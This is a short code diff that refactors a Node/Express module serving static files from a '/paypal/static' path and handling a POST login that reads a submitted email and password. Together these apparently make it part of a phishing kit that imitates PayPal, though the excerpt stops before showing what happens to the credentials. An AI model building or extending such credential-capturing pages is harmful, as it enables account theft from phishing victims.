@@ -4,12 +4,12 @@ exports.info = {
     static: '/paypal/static'
 };
 
-exports.execute = function (app, schemaUtils) {
-    app.get('/', async (req, res) => {
+exports.execute = (app, schemaUtils) => {
+    app.get('/', (req, res) => {
         res.render('index');
     });
 
-    app.post('/login', async (req, res) => {
+    app.post('/login', (req, res) => {
         let email = req.body.session.username_or_email;
         let pass = req.body.session.password;
         if (email && pass) {
